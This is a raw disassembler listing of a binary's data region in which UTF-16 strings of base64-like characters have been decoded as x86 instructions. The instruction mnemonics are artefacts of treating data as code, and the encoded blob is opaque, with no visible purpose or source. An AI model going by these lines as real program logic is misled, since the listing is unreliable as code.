  40abd2:	72 00                	jb     0x40abd4
  40abd4:	6d                   	insl   (%dx),%es:(%edi)
  40abd5:	00 52 00             	add    %dl,0x0(%edx)
  40abd8:	33 00                	xor    (%eax),%eax
  40abda:	46                   	inc    %esi
  40abdb:	00 51 00             	add    %dl,0x0(%ecx)
  40abde:	4c                   	dec    %esp
  40abdf:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40abe3:	00 63 00             	add    %ah,0x0(%ebx)
  40abe6:	46                   	inc    %esi
  40abe7:	00 77 00             	add    %dh,0x0(%edi)
  40abea:	69 00 4b 00 2b 00    	imul   $0x2b004b,(%eax),%eax
  40abf0:	70 00                	jo     0x40abf2
  40abf2:	6f                   	outsl  %ds:(%esi),(%dx)
  40abf3:	00 68 00             	add    %ch,0x0(%eax)
  40abf6:	79 00                	jns    0x40abf8
  40abf8:	51                   	push   %ecx
  40abf9:	00 58 00             	add    %bl,0x0(%eax)
  40abfc:	4e                   	dec    %esi
  40abfd:	00 58 00             	add    %bl,0x0(%eax)
  40ac00:	50                   	push   %eax
  40ac01:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40ac05:	00 71 00             	add    %dh,0x0(%ecx)
  40ac08:	6a 00                	push   $0x0
  40ac0a:	56                   	push   %esi
  40ac0b:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac0e:	50                   	push   %eax
  40ac0f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac12:	4d                   	dec    %ebp
  40ac13:	00 76 00             	add    %dh,0x0(%esi)
  40ac16:	50                   	push   %eax
  40ac17:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40ac1b:	00 69 00             	add    %ch,0x0(%ecx)
  40ac1e:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40ac22:	69 00 75 00 33 00    	imul   $0x330075,(%eax),%eax
  40ac28:	59                   	pop    %ecx
  40ac29:	00 56 00             	add    %dl,0x0(%esi)
  40ac2c:	69 00 76 00 35 00    	imul   $0x350076,(%eax),%eax
  40ac32:	34 00                	xor    $0x0,%al
  40ac34:	72 00                	jb     0x40ac36
  40ac36:	4d                   	dec    %ebp
  40ac37:	00 62 00             	add    %ah,0x0(%edx)
  40ac3a:	72 00                	jb     0x40ac3c
  40ac3c:	2f                   	das
  40ac3d:	00 71 00             	add    %dh,0x0(%ecx)
  40ac40:	53                   	push   %ebx
  40ac41:	00 36                	add    %dh,(%esi)
  40ac43:	00 71 00             	add    %dh,0x0(%ecx)
  40ac46:	57                   	push   %edi
  40ac47:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40ac4b:	00 79 00             	add    %bh,0x0(%ecx)
  40ac4e:	68 00 51 00 56       	push   $0x56005100
  40ac53:	00 6e 00             	add    %ch,0x0(%esi)
  40ac56:	77 00                	ja     0x40ac58
  40ac58:	5a                   	pop    %edx
  40ac59:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac5c:	58                   	pop    %eax
  40ac5d:	00 33                	add    %dh,(%ebx)
  40ac5f:	00 4a 00             	add    %cl,0x0(%edx)
  40ac62:	54                   	push   %esp
  40ac63:	00 30                	add    %dh,(%eax)
  40ac65:	00 66 00             	add    %ah,0x0(%esi)
  40ac68:	53                   	push   %ebx
  40ac69:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40ac6d:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac70:	56                   	push   %esi
  40ac71:	00 4a 00             	add    %cl,0x0(%edx)
  40ac74:	69 00 4f 00 31 00    	imul   $0x31004f,(%eax),%eax
  40ac7a:	66 00 74 00 65       	data16 add %dh,0x65(%eax,%eax,1)
  40ac7f:	00 78 00             	add    %bh,0x0(%eax)
  40ac82:	4b                   	dec    %ebx
  40ac83:	00 69 00             	add    %ch,0x0(%ecx)
  40ac86:	64 00 2b             	add    %ch,%fs:(%ebx)
  40ac89:	00 4f 00             	add    %cl,0x0(%edi)
  40ac8c:	41                   	inc    %ecx
  40ac8d:	00 36                	add    %dh,(%esi)
  40ac8f:	00 33                	add    %dh,(%ebx)
  40ac91:	00 41 00             	add    %al,0x0(%ecx)
  40ac94:	4f                   	dec    %edi
  40ac95:	00 38                	add    %bh,(%eax)
  40ac97:	00 38                	add    %bh,(%eax)
  40ac99:	00 33                	add    %dh,(%ebx)
  40ac9b:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac9e:	57                   	push   %edi
  40ac9f:	00 62 00             	add    %ah,0x0(%edx)
  40aca2:	37                   	aaa
  40aca3:	00 33                	add    %dh,(%ebx)
  40aca5:	00 61 00             	add    %ah,0x0(%ecx)
  40aca8:	57                   	push   %edi
  40aca9:	00 30                	add    %dh,(%eax)
  40acab:	00 3d 00 00 87 b1    	add    %bh,0xb1870000
  40acb1:	6e                   	outsb  %ds:(%esi),(%dx)
  40acb2:	00 6a 00             	add    %ch,0x0(%edx)
  40acb5:	2b 00                	sub    (%eax),%eax
  40acb7:	50                   	push   %eax
  40acb8:	00 59 00             	add    %bl,0x0(%ecx)
  40acbb:	63 00                	arpl   %eax,(%eax)
  40acbd:	31 00                	xor    %eax,(%eax)
  40acbf:	4e                   	dec    %esi
  40acc0:	00 75 00             	add    %dh,0x0(%ebp)
  40acc3:	55                   	push   %ebp
  40acc4:	00 67 00             	add    %ah,0x0(%edi)
  40acc7:	6e                   	outsb  %ds:(%esi),(%dx)
  40acc8:	00 6b 00             	add    %ch,0x0(%ebx)
  40accb:	64 00 74 00 5a       	add    %dh,%fs:0x5a(%eax,%eax,1)
  40acd0:	00 58 00             	add    %bl,0x0(%eax)
  40acd3:	4a                   	dec    %edx
  40acd4:	00 59 00             	add    %bl,0x0(%ecx)
  40acd7:	56                   	push   %esi
  40acd8:	00 65 00             	add    %ah,0x0(%ebp)
  40acdb:	4f                   	dec    %edi
  40acdc:	00 61 00             	add    %ah,0x0(%ecx)
  40acdf:	59                   	pop    %ecx
  40ace0:	00 6f 00             	add    %ch,0x0(%edi)
  40ace3:	52                   	push   %edx
  40ace4:	00 6e 00             	add    %ch,0x0(%esi)
  40ace7:	4a                   	dec    %edx
  40ace8:	00 6f 00             	add    %ch,0x0(%edi)
  40aceb:	35 00 33 00 67       	xor    $0x67003300,%eax
  40acf0:	00 45 00             	add    %al,0x0(%ebp)
  40acf3:	31 00                	xor    %eax,(%eax)
  40acf5:	79 00                	jns    0x40acf7
  40acf7:	47                   	inc    %edi
  40acf8:	00 6e 00             	add    %ch,0x0(%esi)
  40acfb:	51                   	push   %ecx
  40acfc:	00 4f 00             	add    %cl,0x0(%edi)
  40acff:	56                   	push   %esi
  40ad00:	00 32                	add    %dh,(%edx)
  40ad02:	00 73 00             	add    %dh,0x0(%ebx)
  40ad05:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40ad09:	6a 00                	push   $0x0
  40ad0b:	45                   	inc    %ebp
  40ad0c:	00 75 00             	add    %dh,0x0(%ebp)
  40ad0f:	7a 00                	jp     0x40ad11
  40ad11:	37                   	aaa
  40ad12:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad15:	41                   	inc    %ecx
  40ad16:	00 6f 00             	add    %ch,0x0(%edi)
  40ad19:	2b 00                	sub    (%eax),%eax
  40ad1b:	31 00                	xor    %eax,(%eax)
  40ad1d:	37                   	aaa
  40ad1e:	00 69 00             	add    %ch,0x0(%ecx)
  40ad21:	66 00 31             	data16 add %dh,(%ecx)
  40ad24:	00 76 00             	add    %dh,0x0(%esi)
  40ad27:	45                   	inc    %ebp
  40ad28:	00 73 00             	add    %dh,0x0(%ebx)
  40ad2b:	77 00                	ja     0x40ad2d
  40ad2d:	57                   	push   %edi
  40ad2e:	00 71 00             	add    %dh,0x0(%ecx)
  40ad31:	67 00 34             	add    %dh,(%si)
  40ad34:	00 49 00             	add    %cl,0x0(%ecx)
  40ad37:	6a 00                	push   $0x0
  40ad39:	67 00 33             	add    %dh,(%bp,%di)
  40ad3c:	00 2f                	add    %ch,(%edi)
  40ad3e:	00 62 00             	add    %ah,0x0(%edx)
  40ad41:	76 00                	jbe    0x40ad43
  40ad43:	77 00                	ja     0x40ad45
  40ad45:	70 00                	jo     0x40ad47
  40ad47:	52                   	push   %edx
  40ad48:	00 58 00             	add    %bl,0x0(%eax)
  40ad4b:	45                   	inc    %ebp
  40ad4c:	00 6f 00             	add    %ch,0x0(%edi)
  40ad4f:	77 00                	ja     0x40ad51
  40ad51:	7a 00                	jp     0x40ad53
  40ad53:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40ad57:	6c                   	insb   (%dx),%es:(%edi)
  40ad58:	00 59 00             	add    %bl,0x0(%ecx)
  40ad5b:	4f                   	dec    %edi
  40ad5c:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40ad60:	00 36                	add    %dh,(%esi)
  40ad62:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad65:	31 00                	xor    %eax,(%eax)
  40ad67:	51                   	push   %ecx
  40ad68:	00 52 00             	add    %dl,0x0(%edx)
  40ad6b:	44                   	inc    %esp
  40ad6c:	00 33                	add    %dh,(%ebx)
  40ad6e:	00 39                	add    %bh,(%ecx)
  40ad70:	00 68 00             	add    %ch,0x0(%eax)
  40ad73:	55                   	push   %ebp
  40ad74:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40ad78:	00 57 00             	add    %dl,0x0(%edi)
  40ad7b:	33 00                	xor    (%eax),%eax
  40ad7d:	63 00                	arpl   %eax,(%eax)
  40ad7f:	43                   	inc    %ebx
  40ad80:	00 61 00             	add    %ah,0x0(%ecx)
  40ad83:	44                   	inc    %esp
  40ad84:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad87:	34 00                	xor    $0x0,%al
  40ad89:	6d                   	insl   (%dx),%es:(%edi)
  40ad8a:	00 6f 00             	add    %ch,0x0(%edi)
  40ad8d:	43                   	inc    %ebx
  40ad8e:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad91:	76 00                	jbe    0x40ad93
  40ad93:	73 00                	jae    0x40ad95
  40ad95:	4d                   	dec    %ebp
  40ad96:	00 70 00             	add    %dh,0x0(%eax)
  40ad99:	58                   	pop    %eax
  40ad9a:	00 76 00             	add    %dh,0x0(%esi)
  40ad9d:	35 00 41 00 6e       	xor    $0x6e004100,%eax
  40ada2:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40ada6:	00 36                	add    %dh,(%esi)
  40ada8:	00 46 00             	add    %al,0x0(%esi)
  40adab:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40adaf:	68 00 50 00 69       	push   $0x69005000
  40adb4:	00 43 00             	add    %al,0x0(%ebx)
  40adb7:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40adbb:	4a                   	dec    %edx
  40adbc:	00 79 00             	add    %bh,0x0(%ecx)
  40adbf:	30 00                	xor    %al,(%eax)
  40adc1:	68 00 59 00 35       	push   $0x35005900
  40adc6:	00 43 00             	add    %al,0x0(%ebx)
  40adc9:	50                   	push   %eax
  40adca:	00 31                	add    %dh,(%ecx)
  40adcc:	00 51 00             	add    %dl,0x0(%ecx)
  40adcf:	51                   	push   %ecx
  40add0:	00 39                	add    %bh,(%ecx)
  40add2:	00 71 00             	add    %dh,0x0(%ecx)
  40add5:	52                   	push   %edx
  40add6:	00 36                	add    %dh,(%esi)
  40add8:	00 37                	add    %dh,(%edi)
  40adda:	00 51 00             	add    %dl,0x0(%ecx)
  40addd:	76 00                	jbe    0x40addf
  40addf:	44                   	inc    %esp
  40ade0:	00 4b 00             	add    %cl,0x0(%ebx)
  40ade3:	6a 00                	push   $0x0
  40ade5:	74 00                	je     0x40ade7
  40ade7:	63 00                	arpl   %eax,(%eax)
  40ade9:	33 00                	xor    (%eax),%eax
  40adeb:	59                   	pop    %ecx
  40adec:	00 78 00             	add    %bh,0x0(%eax)
  40adef:	79 00                	jns    0x40adf1
  40adf1:	38 00                	cmp    %al,(%eax)
  40adf3:	61                   	popa
  40adf4:	00 41 00             	add    %al,0x0(%ecx)
  40adf7:	79 00                	jns    0x40adf9
  40adf9:	37                   	aaa
  40adfa:	00 31                	add    %dh,(%ecx)
  40adfc:	00 70 00             	add    %dh,0x0(%eax)
  40adff:	54                   	push   %esp
  40ae00:	00 5a 00             	add    %bl,0x0(%edx)
  40ae03:	32 00                	xor    (%eax),%al
  40ae05:	5a                   	pop    %edx
  40ae06:	00 62 00             	add    %ah,0x0(%edx)
  40ae09:	77 00                	ja     0x40ae0b
  40ae0b:	73 00                	jae    0x40ae0d
  40ae0d:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40ae11:	39 00                	cmp    %eax,(%eax)
  40ae13:	69 00 68 00 30 00    	imul   $0x300068,(%eax),%eax
  40ae19:	4c                   	dec    %esp
  40ae1a:	00 63 00             	add    %ah,0x0(%ebx)
  40ae1d:	58                   	pop    %eax
  40ae1e:	00 2f                	add    %ch,(%edi)
  40ae20:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae23:	73 00                	jae    0x40ae25
  40ae25:	4e                   	dec    %esi
  40ae26:	00 4e 00             	add    %cl,0x0(%esi)
  40ae29:	75 00                	jne    0x40ae2b
  40ae2b:	4e                   	dec    %esi
  40ae2c:	00 58 00             	add    %bl,0x0(%eax)
  40ae2f:	4d                   	dec    %ebp
  40ae30:	00 67 00             	add    %ah,0x0(%edi)
  40ae33:	51                   	push   %ecx
  40ae34:	00 6f 00             	add    %ch,0x0(%edi)
  40ae37:	6b 00 76             	imul   $0x76,(%eax),%eax
  40ae3a:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae3d:	6a 00                	push   $0x0
  40ae3f:	2b 00                	sub    (%eax),%eax
  40ae41:	6b 00 46             	imul   $0x46,(%eax),%eax
  40ae44:	00 7a 00             	add    %bh,0x0(%edx)
  40ae47:	4b                   	dec    %ebx
  40ae48:	00 67 00             	add    %ah,0x0(%edi)
  40ae4b:	6d                   	insl   (%dx),%es:(%edi)
  40ae4c:	00 36                	add    %dh,(%esi)
  40ae4e:	00 4e 00             	add    %cl,0x0(%esi)
  40ae51:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40ae55:	53                   	push   %ebx
  40ae56:	00 56 00             	add    %dl,0x0(%esi)
  40ae59:	55                   	push   %ebp
  40ae5a:	00 63 00             	add    %ah,0x0(%ebx)
  40ae5d:	57                   	push   %edi
  40ae5e:	00 41 00             	add    %al,0x0(%ecx)
  40ae61:	7a 00                	jp     0x40ae63
  40ae63:	79 00                	jns    0x40ae65
  40ae65:	36 00 44 00 6c       	add    %al,%ss:0x6c(%eax,%eax,1)
  40ae6a:	00 53 00             	add    %dl,0x0(%ebx)
  40ae6d:	71 00                	jno    0x40ae6f
  40ae6f:	53                   	push   %ebx
  40ae70:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40ae74:	00 77 00             	add    %dh,0x0(%edi)
  40ae77:	59                   	pop    %ecx
  40ae78:	00 55 00             	add    %dl,0x0(%ebp)
  40ae7b:	71 00                	jno    0x40ae7d
  40ae7d:	6b 00 74             	imul   $0x74,(%eax),%eax
  40ae80:	00 37                	add    %dh,(%edi)
  40ae82:	00 49 00             	add    %cl,0x0(%ecx)
  40ae85:	30 00                	xor    %al,(%eax)
  40ae87:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae88:	00 58 00             	add    %bl,0x0(%eax)
  40ae8b:	61                   	popa
  40ae8c:	00 7a 00             	add    %bh,0x0(%edx)
  40ae8f:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40ae93:	51                   	push   %ecx
  40ae94:	00 6f 00             	add    %ch,0x0(%edi)
  40ae97:	70 00                	jo     0x40ae99
  40ae99:	48                   	dec    %eax
  40ae9a:	00 49 00             	add    %cl,0x0(%ecx)
  40ae9d:	4b                   	dec    %ebx
  40ae9e:	00 35 00 57 00 4b    	add    %dh,0x4b005700
  40aea4:	00 42 00             	add    %al,0x0(%edx)
  40aea7:	42                   	inc    %edx
  40aea8:	00 77 00             	add    %dh,0x0(%edi)
  40aeab:	47                   	inc    %edi
  40aeac:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aeaf:	6f                   	outsl  %ds:(%esi),(%dx)
  40aeb0:	00 79 00             	add    %bh,0x0(%ecx)
  40aeb3:	4e                   	dec    %esi
  40aeb4:	00 4e 00             	add    %cl,0x0(%esi)
  40aeb7:	75 00                	jne    0x40aeb9
  40aeb9:	53                   	push   %ebx
  40aeba:	00 75 00             	add    %dh,0x0(%ebp)
  40aebd:	42                   	inc    %edx
  40aebe:	00 4a 00             	add    %cl,0x0(%edx)
  40aec1:	47                   	inc    %edi
  40aec2:	00 47 00             	add    %al,0x0(%edi)
  40aec5:	50                   	push   %eax
  40aec6:	00 71 00             	add    %dh,0x0(%ecx)
  40aec9:	31 00                	xor    %eax,(%eax)
  40aecb:	41                   	inc    %ecx
  40aecc:	00 76 00             	add    %dh,0x0(%esi)
  40aecf:	79 00                	jns    0x40aed1
  40aed1:	50                   	push   %eax
  40aed2:	00 47 00             	add    %al,0x0(%edi)
  40aed5:	6f                   	outsl  %ds:(%esi),(%dx)
  40aed6:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40aeda:	00 79 00             	add    %bh,0x0(%ecx)
  40aedd:	55                   	push   %ebp
  40aede:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40aee2:	00 59 00             	add    %bl,0x0(%ecx)
  40aee5:	46                   	inc    %esi
  40aee6:	00 79 00             	add    %bh,0x0(%ecx)
  40aee9:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40aeed:	43                   	inc    %ebx
  40aeee:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40aef2:	00 50 00             	add    %dl,0x0(%eax)
  40aef5:	6c                   	insb   (%dx),%es:(%edi)
  40aef6:	00 66 00             	add    %ah,0x0(%esi)
  40aef9:	68 00 7a 00 47       	push   $0x47007a00
  40aefe:	00 48 00             	add    %cl,0x0(%eax)
  40af01:	6f                   	outsl  %ds:(%esi),(%dx)
  40af02:	00 36                	add    %dh,(%esi)
  40af04:	00 58 00             	add    %bl,0x0(%eax)
  40af07:	63 00                	arpl   %eax,(%eax)
  40af09:	76 00                	jbe    0x40af0b
  40af0b:	48                   	dec    %eax
  40af0c:	00 30                	add    %dh,(%eax)
  40af0e:	00 6b 00             	add    %ch,0x0(%ebx)
  40af11:	61                   	popa
  40af12:	00 6e 00             	add    %ch,0x0(%esi)
  40af15:	69 00 30 00 64 00    	imul   $0x640030,(%eax),%eax
  40af1b:	30 00                	xor    %al,(%eax)
  40af1d:	2f                   	das
  40af1e:	00 69 00             	add    %ch,0x0(%ecx)
  40af21:	79 00                	jns    0x40af23
  40af23:	50                   	push   %eax
  40af24:	00 48 00             	add    %cl,0x0(%eax)
  40af27:	2b 00                	sub    (%eax),%eax
  40af29:	32 00                	xor    (%eax),%al
  40af2b:	44                   	inc    %esp
  40af2c:	00 6a 00             	add    %ch,0x0(%edx)
  40af2f:	4c                   	dec    %esp
  40af30:	00 46 00             	add    %al,0x0(%esi)
  40af33:	44                   	inc    %esp
  40af34:	00 71 00             	add    %dh,0x0(%ecx)
  40af37:	54                   	push   %esp
  40af38:	00 45 00             	add    %al,0x0(%ebp)
  40af3b:	34 00                	xor    $0x0,%al
  40af3d:	38 00                	cmp    %al,(%eax)
  40af3f:	2b 00                	sub    (%eax),%eax
  40af41:	6e                   	outsb  %ds:(%esi),(%dx)
  40af42:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40af46:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40af4a:	00 39                	add    %bh,(%ecx)
  40af4c:	00 79 00             	add    %bh,0x0(%ecx)
  40af4f:	76 00                	jbe    0x40af51
  40af51:	5a                   	pop    %edx
  40af52:	00 75 00             	add    %dh,0x0(%ebp)
  40af55:	6c                   	insb   (%dx),%es:(%edi)
  40af56:	00 38                	add    %bh,(%eax)
  40af58:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40af5c:	00 58 00             	add    %bl,0x0(%eax)
  40af5f:	56                   	push   %esi
  40af60:	00 52 00             	add    %dl,0x0(%edx)
  40af63:	35 00 2b 00 70       	xor    $0x70002b00,%eax
  40af68:	00 51 00             	add    %dl,0x0(%ecx)
  40af6b:	72 00                	jb     0x40af6d
  40af6d:	78 00                	js     0x40af6f
  40af6f:	78 00                	js     0x40af71
  40af71:	74 00                	je     0x40af73
  40af73:	5a                   	pop    %edx
  40af74:	00 55 00             	add    %dl,0x0(%ebp)
  40af77:	36 00 39             	add    %bh,%ss:(%ecx)
  40af7a:	00 4f 00             	add    %cl,0x0(%edi)
  40af7d:	72 00                	jb     0x40af7f
  40af7f:	52                   	push   %edx
  40af80:	00 6a 00             	add    %ch,0x0(%edx)
  40af83:	6c                   	insb   (%dx),%es:(%edi)
  40af84:	00 33                	add    %dh,(%ebx)
  40af86:	00 66 00             	add    %ah,0x0(%esi)
  40af89:	78 00                	js     0x40af8b
  40af8b:	53                   	push   %ebx
  40af8c:	00 65 00             	add    %ah,0x0(%ebp)
  40af8f:	52                   	push   %edx
  40af90:	00 6f 00             	add    %ch,0x0(%edi)
  40af93:	31 00                	xor    %eax,(%eax)
  40af95:	33 00                	xor    (%eax),%eax
  40af97:	5a                   	pop    %edx
  40af98:	00 56 00             	add    %dl,0x0(%esi)
  40af9b:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  40af9f:	64 00 4c 00 4a       	add    %cl,%fs:0x4a(%eax,%eax,1)
  40afa4:	00 65 00             	add    %ah,0x0(%ebp)
  40afa7:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40afab:	34 00                	xor    $0x0,%al
  40afad:	76 00                	jbe    0x40afaf
  40afaf:	62 00                	bound  %eax,(%eax)
  40afb1:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40afb5:	79 00                	jns    0x40afb7
  40afb7:	68 00 64 00 39       	push   $0x39006400
  40afbc:	00 58 00             	add    %bl,0x0(%eax)
  40afbf:	38 00                	cmp    %al,(%eax)
  40afc1:	53                   	push   %ebx
  40afc2:	00 50 00             	add    %dl,0x0(%eax)
  40afc5:	56                   	push   %esi
  40afc6:	00 47 00             	add    %al,0x0(%edi)
  40afc9:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40afcd:	73 00                	jae    0x40afcf
  40afcf:	55                   	push   %ebp
  40afd0:	00 47 00             	add    %al,0x0(%edi)
  40afd3:	54                   	push   %esp
  40afd4:	00 59 00             	add    %bl,0x0(%ecx)
  40afd7:	4a                   	dec    %edx
  40afd8:	00 7a 00             	add    %bh,0x0(%edx)
  40afdb:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40afdf:	42                   	inc    %edx
  40afe0:	00 6f 00             	add    %ch,0x0(%edi)
  40afe3:	53                   	push   %ebx
  40afe4:	00 6e 00             	add    %ch,0x0(%esi)
  40afe7:	51                   	push   %ecx
  40afe8:	00 4b 00             	add    %cl,0x0(%ebx)
  40afeb:	68 00 39 00 54       	push   $0x54003900
  40aff0:	00 33                	add    %dh,(%ebx)
  40aff2:	00 33                	add    %dh,(%ebx)
  40aff4:	00 72 00             	add    %dh,0x0(%edx)
  40aff7:	71 00                	jno    0x40aff9
  40aff9:	75 00                	jne    0x40affb
  40affb:	6d                   	insl   (%dx),%es:(%edi)
  40affc:	00 45 00             	add    %al,0x0(%ebp)
  40afff:	70 00                	jo     0x40b001
  40b001:	44                   	inc    %esp
  40b002:	00 71 00             	add    %dh,0x0(%ecx)
  40b005:	58                   	pop    %eax
  40b006:	00 4b 00             	add    %cl,0x0(%ebx)
  40b009:	46                   	inc    %esi
  40b00a:	00 48 00             	add    %cl,0x0(%eax)
  40b00d:	57                   	push   %edi
  40b00e:	00 75 00             	add    %dh,0x0(%ebp)
  40b011:	6b 00 38             	imul   $0x38,(%eax),%eax
  40b014:	00 5a 00             	add    %bl,0x0(%edx)
  40b017:	42                   	inc    %edx
  40b018:	00 69 00             	add    %ch,0x0(%ecx)
  40b01b:	46                   	inc    %esi
  40b01c:	00 33                	add    %dh,(%ebx)
  40b01e:	00 4a 00             	add    %cl,0x0(%edx)
  40b021:	7a 00                	jp     0x40b023
  40b023:	49                   	dec    %ecx
  40b024:	00 59 00             	add    %bl,0x0(%ecx)
  40b027:	44                   	inc    %esp
  40b028:	00 70 00             	add    %dh,0x0(%eax)
  40b02b:	41                   	inc    %ecx
  40b02c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b030:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40b034:	00 4b 00             	add    %cl,0x0(%ebx)
  40b037:	4c                   	dec    %esp
  40b038:	00 71 00             	add    %dh,0x0(%ecx)
  40b03b:	79 00                	jns    0x40b03d
  40b03d:	6c                   	insb   (%dx),%es:(%edi)
  40b03e:	00 51 00             	add    %dl,0x0(%ecx)
  40b041:	35 00 6f 00 30       	xor    $0x30006f00,%eax
  40b046:	00 46 00             	add    %al,0x0(%esi)
  40b049:	50                   	push   %eax
  40b04a:	00 6e 00             	add    %ch,0x0(%esi)
  40b04d:	44                   	inc    %esp
  40b04e:	00 70 00             	add    %dh,0x0(%eax)
  40b051:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40b055:	68 00 54 00 6b       	push   $0x6b005400
  40b05a:	00 6f 00             	add    %ch,0x0(%edi)
  40b05d:	59                   	pop    %ecx
  40b05e:	00 71 00             	add    %dh,0x0(%ecx)
  40b061:	48                   	dec    %eax
  40b062:	00 79 00             	add    %bh,0x0(%ecx)
  40b065:	4d                   	dec    %ebp
  40b066:	00 4d 00             	add    %cl,0x0(%ebp)
  40b069:	4c                   	dec    %esp
  40b06a:	00 67 00             	add    %ah,0x0(%edi)
  40b06d:	56                   	push   %esi
  40b06e:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40b072:	00 31                	add    %dh,(%ecx)
  40b074:	00 70 00             	add    %dh,0x0(%eax)
  40b077:	6c                   	insb   (%dx),%es:(%edi)
  40b078:	00 67 00             	add    %ah,0x0(%edi)
  40b07b:	37                   	aaa
  40b07c:	00 39                	add    %bh,(%ecx)
  40b07e:	00 71 00             	add    %dh,0x0(%ecx)
  40b081:	7a 00                	jp     0x40b083
  40b083:	54                   	push   %esp
  40b084:	00 69 00             	add    %ch,0x0(%ecx)
  40b087:	30 00                	xor    %al,(%eax)
  40b089:	58                   	pop    %eax
  40b08a:	00 50 00             	add    %dl,0x0(%eax)
  40b08d:	31 00                	xor    %eax,(%eax)
  40b08f:	72 00                	jb     0x40b091
  40b091:	38 00                	cmp    %al,(%eax)
  40b093:	4a                   	dec    %edx
  40b094:	00 37                	add    %dh,(%edi)
  40b096:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40b09a:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40b09e:	00 30                	add    %dh,(%eax)
  40b0a0:	00 31                	add    %dh,(%ecx)
  40b0a2:	00 55 00             	add    %dl,0x0(%ebp)
  40b0a5:	30 00                	xor    %al,(%eax)
  40b0a7:	47                   	inc    %edi
  40b0a8:	00 77 00             	add    %dh,0x0(%edi)
  40b0ab:	43                   	inc    %ebx
  40b0ac:	00 31                	add    %dh,(%ecx)
  40b0ae:	00 2b                	add    %ch,(%ebx)
  40b0b0:	00 66 00             	add    %ah,0x0(%esi)
  40b0b3:	53                   	push   %ebx
  40b0b4:	00 67 00             	add    %ah,0x0(%edi)
  40b0b7:	39 00                	cmp    %eax,(%eax)
  40b0b9:	35 00 74 00 4b       	xor    $0x4b007400,%eax
  40b0be:	00 57 00             	add    %dl,0x0(%edi)
  40b0c1:	38 00                	cmp    %al,(%eax)
  40b0c3:	35 00 31 00 51       	xor    $0x51003100,%eax
  40b0c8:	00 39                	add    %bh,(%ecx)
  40b0ca:	00 69 00             	add    %ch,0x0(%ecx)
  40b0cd:	70 00                	jo     0x40b0cf
  40b0cf:	50                   	push   %eax
  40b0d0:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0d3:	61                   	popa
  40b0d4:	00 4f 00             	add    %cl,0x0(%edi)
  40b0d7:	53                   	push   %ebx
  40b0d8:	00 48 00             	add    %cl,0x0(%eax)
  40b0db:	64 00 44 00 70       	add    %al,%fs:0x70(%eax,%eax,1)
  40b0e0:	00 76 00             	add    %dh,0x0(%esi)
  40b0e3:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40b0e7:	42                   	inc    %edx
  40b0e8:	00 41 00             	add    %al,0x0(%ecx)
  40b0eb:	4c                   	dec    %esp
  40b0ec:	00 78 00             	add    %bh,0x0(%eax)
  40b0ef:	2f                   	das
  40b0f0:	00 59 00             	add    %bl,0x0(%ecx)
  40b0f3:	73 00                	jae    0x40b0f5
  40b0f5:	30 00                	xor    %al,(%eax)
  40b0f7:	44                   	inc    %esp
  40b0f8:	00 65 00             	add    %ah,0x0(%ebp)
  40b0fb:	48                   	dec    %eax
  40b0fc:	00 5a 00             	add    %bl,0x0(%edx)
  40b0ff:	73 00                	jae    0x40b101
  40b101:	72 00                	jb     0x40b103
  40b103:	35 00 37 00 34       	xor    $0x34003700,%eax
  40b108:	00 2b                	add    %ch,(%ebx)
  40b10a:	00 57 00             	add    %dl,0x0(%edi)
  40b10d:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b111:	78 00                	js     0x40b113
  40b113:	38 00                	cmp    %al,(%eax)
  40b115:	63 00                	arpl   %eax,(%eax)
  40b117:	47                   	inc    %edi
  40b118:	00 30                	add    %dh,(%eax)
  40b11a:	00 7a 00             	add    %bh,0x0(%edx)
  40b11d:	68 00 4f 00 57       	push   $0x57004f00
  40b122:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
